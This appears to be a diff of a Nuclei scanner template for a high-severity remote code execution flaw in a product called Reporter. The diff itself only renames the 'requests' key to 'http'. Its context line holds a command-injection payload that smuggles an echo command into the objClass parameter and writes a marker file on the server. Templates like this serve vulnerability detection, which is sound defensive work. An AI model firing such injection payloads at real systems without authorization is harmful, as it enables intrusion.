@@ -6,7 +6,7 @@ info:
   severity: high
   tags: Reporter,rce
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/view/Behavior/toQuery.php?method=getList&objClass=%0aecho%20%27f029ff010012ms%27%20>/var/www/reporter/view/Behavior/f029ff010012ms.txt%0a"
